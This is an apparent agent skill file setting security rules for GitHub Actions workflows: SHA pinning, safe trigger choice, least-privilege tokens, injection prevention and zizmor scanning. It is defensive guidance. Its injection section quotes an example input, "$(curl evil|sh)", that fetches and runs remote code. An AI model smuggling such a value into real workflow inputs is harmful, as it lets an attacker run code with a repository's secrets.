---
name: gha-security
description: Security rules for GitHub Actions workflows. Use when creating or editing any file under .github/workflows/ or .github/actions/, or when a zizmor finding needs fixing.
---

Apply every rule below when authoring or editing a workflow. This repo is the **canonical source of reusable workflows** consumed by other orgs (via the public `isw-kudos/github-actions` repo) — a security defect here propagates to every consumer. Never relax a rule to make CI pass; fix the workflow.

## 1. Pin every action to a full commit SHA

Tags and branches are mutable — a compromised maintainer (or a force-pushed tag) can swap the code behind `@v4` without changing your file. A 40-char commit SHA is immutable.

```yaml
# ✅ correct — full SHA + version comment
uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0

# ❌ wrong — mutable ref
uses: actions/checkout@v6
uses: actions/checkout@main
```

Applies to **all** actions including first-party `actions/*` and any reusable workflow called via `uses:`. The trailing `# vX.Y.Z` comment is mandatory (Renovate maintains it on each SHA bump — `pinDigests: true` is set for the `github-actions` manager).

To resolve a tag to its SHA:
```bash
gh api repos/<owner>/<repo>/git/refs/tags/<tag> --jq '.object.sha'
# if that returns an annotated-tag object, dereference it:
gh api repos/<owner>/<repo>/git/tags/<sha> --jq '.object.sha'
```

## 2. `pull_request` vs `pull_request_target` — pick by what the job does

These are NOT interchangeable. The difference is security-critical:

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow def that runs | **from the PR head** (PR can modify it) | **from the base branch** (PR cannot modify it) |
| Secrets / write token on fork PRs | ❌ none, read-only token | ✅ full secrets + write token |
| Checking out & running PR code | safe | **DANGEROUS** |

Rules:

- **Build / lint / test workflows that execute PR code** (e.g. `pre-commit.yml`) → keep `pull_request`. Forks get a read-only token and **no secrets**. This is the safe default — do **not** "upgrade" it to `pull_request_target`.
- **`pull_request_target` is only for jobs that must run with elevated context and do NOT execute untrusted PR code** — labelling, triage, posting comments. If one is genuinely needed, its trigger must carry a justified `# zizmor: ignore[dangerous-triggers]` comment.
- **Never** combine `pull_request_target` with `actions/checkout` of the PR head followed by build/test/`run` of that code — that runs attacker code with your secrets. This is the single most exploited Actions misconfiguration.
- If you must use `pull_request_target`: check out `github.event.pull_request.head.sha` (immutable) **not** `head.ref` (mutable race / TOCTOU), never `run:` the checked-out code, and document the mitigations in the workflow header.
- If a workflow genuinely must build untrusted PR code **and then** act with secrets, use the split pattern: an unprivileged `pull_request` workflow uploads results as an artifact; a separate `workflow_run` workflow runs privileged, downloads the artifact into a temp dir, validates it (artifact poisoning), and acts. Filter on `conclusion == 'success'`.

## 3. Least-privilege permissions

Set a read-only (or empty) default at the top, escalate per-job only as needed:
```yaml
permissions: {} # or contents: read
jobs:
  comment:
    permissions:
      pull-requests: write # only the job that needs it
```
Never use blanket `permissions: write-all`. A workflow with no `permissions:` block at all gets the repo default token — zizmor flags this (`excessive-permissions`).

**GitHub App tokens too**: every `actions/create-github-app-token` step must scope the token with `permission-<name>` inputs (e.g. `permission-contents: write`) — otherwise it inherits the app's blanket installation permissions (zizmor `github-app`, High). Note: a token that pushes `.github/workflows/**` changes also needs `permission-workflows: write`.

## 4. Prevent injection from untrusted input

**Untrusted sources** (attacker-controllable): `github.event.*` fields (PR/issue title, body, branch/ref name, author login, commit message), `git` output, downloaded artifacts, and third-party action outputs. In *reusable* workflows, treat `inputs.*` from the caller as untrusted too — this repo's workflows are called from other repos.

**Script injection** — never interpolate a `${{ }}` expression straight into `run:`:
```yaml
# ❌ injection — a value like "$(curl evil|sh)" executes
- run: echo "${{ inputs.service_name }}"

# ✅ pass through an env var, quote on use
- env:
    SERVICE_NAME: ${{ inputs.service_name }}
  run: echo "$SERVICE_NAME"
```
This is the house style for **all** `run:` blocks in this repo, including low-risk `vars.*` / `steps.*.outputs.*` expansions — it keeps zizmor's `template-injection` audit at zero findings. `with:` inputs to actions are fine to template directly.

**Environment / output injection** — never echo untrusted data into `$GITHUB_ENV` or `$GITHUB_OUTPUT`; an attacker can inject env vars (`LD_PRELOAD`, `PATH`) or clobber another step's outputs. Validate against a strict allowlist first and beware multiline payloads.

## 5. Scan workflows automatically

Three layers, all pinned to the same zizmor CLI version:

- **CI** — `.github/workflows/zizmor.yml` runs `zizmorcore/zizmor-action` on every `.github/workflows/**` / `.github/actions/**` change and on push to `main`. `advanced-security: false` → GitHub annotations + **fails the job on findings** (SARIF needs GHAS, which a private repo lacks).
- **pre-commit** — the `zizmor` hook in `.pre-commit-config.yaml` audits staged workflow files (offline, regular persona) before commit.
- **Claude hook** — `.claude/hooks/zizmor-check.sh` (PostToolUse) re-audits any workflow file Claude edits, immediately surfacing findings.

Don't fix a zizmor failure by silencing it — fix the workflow, or add a justified `# zizmor: ignore[rule]` end-of-line comment with a reason. Keep the action, its `version:` input, and the pre-commit `rev:` pinned; Renovate bumps all three.

## 6. Other defaults

- `concurrency:` group with `cancel-in-progress: true` to kill superseded runs (releases: `cancel-in-progress: false` — never kill a half-finished release).
- `persist-credentials: false` on **every** `actions/checkout` unless the job pushes back with that token (the `release-*.yml` workflows do).
- Prefer OIDC (short-lived federated creds) over long-lived cloud secrets — all AWS access here uses `aws-actions/configure-aws-credentials` with a role ARN.
- SHA bumps arrive as reviewable PRs via **Renovate**. Do not add a Dependabot config.
- Gate privileged jobs behind a GitHub *Environment* (e.g. `ecs-deploy.yml` uses `environment: ${{ inputs.environment }}`).
- Never run public-repo or fork PR workloads on a self-hosted runner.

## Pre-merge checklist for any workflow change

- [ ] Every `uses:` is a full SHA with a `# vX.Y.Z` comment
- [ ] Trigger event matches what the job does (§2); no `pull_request_target` + checkout-and-run of PR head
- [ ] Top-level `permissions:` is read-only or `{}`; per-job escalation is minimal; app tokens carry `permission-*` inputs
- [ ] No `${{ }}` expressions inside `run:` — everything goes through `env:`
- [ ] `persist-credentials: false` on checkouts that don't push
- [ ] `zizmor --persona regular --offline .github/workflows/` reports no findings
